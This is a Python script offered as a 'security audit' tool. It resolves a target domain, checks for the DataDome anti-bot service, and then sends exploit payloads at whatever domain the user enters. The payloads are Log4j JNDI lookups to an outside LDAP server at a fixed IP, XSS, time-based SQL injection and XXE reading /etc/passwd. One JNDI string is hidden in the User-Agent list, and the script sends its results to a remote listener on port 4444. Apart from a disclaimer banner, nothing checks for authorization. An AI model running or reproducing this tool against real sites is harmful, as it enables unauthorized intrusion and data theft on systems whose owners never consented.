import requests
import json
import time
import random
import os
import socket
import dns.resolver
from colorama import Fore, Style, init

init(autoreset=True)

# Configuration for Data Destinations
LOCAL_REPORT_PATH = "/home/qenmity/py/fromdasttodiscovery/results.json"
REMOTE_LISTENER_URL = "http://100.115.92.202:4444"

class ZaxkerothAudit:
    def __init__(self):
        self.version = "1.1-Bundle-Adv"
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "${${::-j}${::-n}${::-d}${::-i}:ldap://198.185.165.105:1389/Exploit}" # JNDI/Log4j Probe Header
        ]
        self.banner = rf"""
{Fore.RED}########################################################
#          ZAXKEROTH SECURITY AUDIT v1.1               #
#    {Fore.WHITE}Research - Defense - Education - Training{Fore.RED}         #
########################################################
{Style.RESET_ALL}
[!] LEGAL: Authorized auditing only. Researchers are responsible 
for their own conduct.
"""

    def display_ui(self):
        print(self.banner)

    # --- Stage 1: Discovery (MX Records & IP) ---
    def run_discovery(self, domain):
        print(f"\n{Fore.BLUE}[*] Stage 1: Infrastructure & MX Audit")
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in answers:
                print(f"{Fore.YELLOW}[!] ACTIVE MAIL SERVER: {rdata.exchange} (Priority: {rdata.preference})")
        except Exception as e:
            print(f"{Fore.RED}[-] MX Record Lookup Failed: {e}")
        
        try:
            ip = socket.gethostbyname(domain)
            print(f"{Fore.GREEN}[+] Target IP Resolved: {ip}")
            return ip
        except: return None

    # --- Stage 2: WAF & Challenge Analysis ---
    def detect_waf_challenges(self, url):
        print(f"\n{Fore.BLUE}[*] Stage 2: WAF & Anti-Bot Detection")
        try:
            response = self.session.get(url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
            if "datadome" in response.text.lower() or "datadome" in str(response.cookies):
                print(f"{Fore.RED}[!] DataDome WAF Detected.")
                if input(f"{Fore.YELLOW}[!]: Challenges found. Proceed? [Y/q]: ").lower() != 'y': return False
            return True
        except Exception as e:
            print(f"{Fore.RED}[X] Connection Error: {e}")
            return False

    # --- Stage 3: DAST & Automated Payload Injection ---
    def run_vulnerability_scan(self, url):
        print(f"\n{Fore.RED}[*] Stage 3: Advanced DAST Payload Inspection")
        findings = []
        
        # Payload Groups
        payload_groups = {
            "RCE/JNDI": ["${jndi:ldap://198.185.165.105:1389/Exploit}"],
            "XSS": ["<img src=x onerror=alert('XSS-A')>", "\"><svg/onload=alert(1)"],
            "SQLi": ["' OR (SELECT SLEEP(5))=0--"],
            "XXE": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"]
        }

        for category, items in payload_groups.items():
            for payload in items:
                print(f"{Fore.YELLOW}[*] Testing {category}: {payload[:40]}...")
                time.sleep(random.uniform(1, 3))
                try:
                    # Test via custom User-Agent and POST data
                    headers = {"User-Agent": payload, "Referer": url}
                    res = self.session.post(url, headers=headers, data={"test": payload}, timeout=10)
                    
                    if res.status_code == 200:
                        findings.append({"type": category, "payload": payload, "status": "Potential Hit"})
                        print(f"{Fore.GREEN}[+] Potential hit for {category}")
                except: pass

        self.finalize_audit(url, findings)

    # --- Finalize: Report Saving & Remote Transmission ---
    def finalize_audit(self, target, findings):
        report = {
            "timestamp": time.ctime(),
            "target": target,
            "findings": findings
        }
        
        # Save Local
        try:
            os.makedirs(os.path.dirname(LOCAL_REPORT_PATH), exist_ok=True)
            with open(LOCAL_REPORT_PATH, 'w') as f:
                json.dump(report, f, indent=4)
            print(f"{Fore.CYAN}[+] Report saved to {LOCAL_REPORT_PATH}")
        except Exception as e: print(f"{Fore.RED}[X] Local save failed: {e}")

        # Remote Transmission (Send to Metasploit/Listener)
        try:
            print(f"{Fore.BLUE}[*] Transmitting data to listener at {REMOTE_LISTENER_URL}")
            requests.post(REMOTE_LISTENER_URL, json=report, timeout=5)
        except: print(f"{Fore.YELLOW}[!] Remote listener unreachable.")

    def start(self):
        self.display_ui()
        domain = input("Enter target domain: ")
        self.run_discovery(domain)
        url = f"https://{domain}"
        if self.detect_waf_challenges(url):
            self.run_vulnerability_scan(url)

if __name__ == "__main__":
    ZaxkerothAudit().start()
